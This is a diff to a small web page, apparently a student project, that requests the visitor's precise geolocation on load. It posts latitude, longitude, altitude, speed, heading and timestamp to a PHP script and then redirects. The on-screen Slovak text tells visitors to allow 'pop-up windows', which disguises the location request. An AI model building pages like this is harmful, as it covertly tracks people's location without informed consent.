@@ -1,67 +1,65 @@
-
 <!DOCTYPE HTML>
 <html>
 <meta content="width=device-width, initial-scale=1" name="viewport" />
    <head>
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
       <script>
          function showLocation(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            alert("Latitude : " + latitude + " Longitude: " + longitude);
-
+            var altitude = position.coords.altitude;
+            var accuracy = position.coords.accuracy;
+            var altitudeaccuracy = position.coords.altitudeAccuracy;
+            var speed = position.coords.speed;
+            var heading = position.coords.heading;
+            var timestamp = position.timestamp;
+            //alert("Latitude : " + latitude + " Longitude: " + longitude + " accuracy: " + accuracy + " altitude: " + altitude + " speed : "+speed + " altitudeaccuracy " + altitudeaccuracy + " heading"+heading + "timestamp" + timestamp);
             $.ajax({
                type : "POST",  //type of method
                url  : "postphpmail.php",  //your page
-               data : { latitude : latitude, longitude : longitude},// passing the values
+               data : { latitude : latitude, longitude : longitude, accuracy : accuracy, altitude : altitude, altitudeaccuracy : altitudeaccuracy, speed : speed, heading : heading, timestamp : timestamp},// passing the values
                success: function(res){
-                                       //do what you want here...
+                      window.location.href = "http://www.stud.fit.vutbr.cz/~xivanc03/compare.php"; //do what you want here...
                        }
            });
        }
          function errorHandler(err) {
             if(err.code == 1) {
-               alert("Error: Access is denied!");
+               alert("Error: Na pokracovanie v projekte povolte vsetky necessary pop-up okna v priehladaci! ");
+
             }
             else if( err.code == 2) {
-               alert("Error: Position is unavailable!");
+               alert("Error: Nie je mozne pokracovat dalej");
             }
          }
          function getLocation(){
             if(navigator.geolocation){
                // timeout at 60000 milliseconds (60 seconds)
-               var options = {timeout:60000};
+               var options = {timeout:60000, enableHighAccuracy: true};
                navigator.geolocation.getCurrentPosition(showLocation, errorHandler, options);
             } else{
-               alert("Sorry, browser does not support geolocation!");
+               alert("Sorry, vyuzite iny prehliadac, preferably: Chrome");
             }
          }
-      /*   function post(){
-
-           var latitude2 = $("#latitude").val();
-           var longitude2 = $("#longitude").val();
-
-           $.post("sendmail.php", {postlat:latitude, postlong:longitude},
-           function (data){
-             $("#result").html(data)
-           }
-         }*/
       </script>
    </head>
    <body style="background-color:Black;">
       <script>getLocation();</script>
-      <p>Please allow all pop up windows to be redirected!</p>
+      <p>Prosim povolte vsetky pop-up okna aby ste boli spravne redirectnuty!</p>
    </body>
    <style>
    p {
   font-size: 30px;
   color: white;
   font-family: "Courier New", Courier, Monospace;
+  margin-top: 10%;
   }
   @media only screen and (max-width: 600px) {
      p {
-      font-size: 50px;
+      font-size: 25px;
       color: white;
       font-family: "Courier New", Courier, Monospace;
+      margin-top: 5%;
     }
   }
    </style>
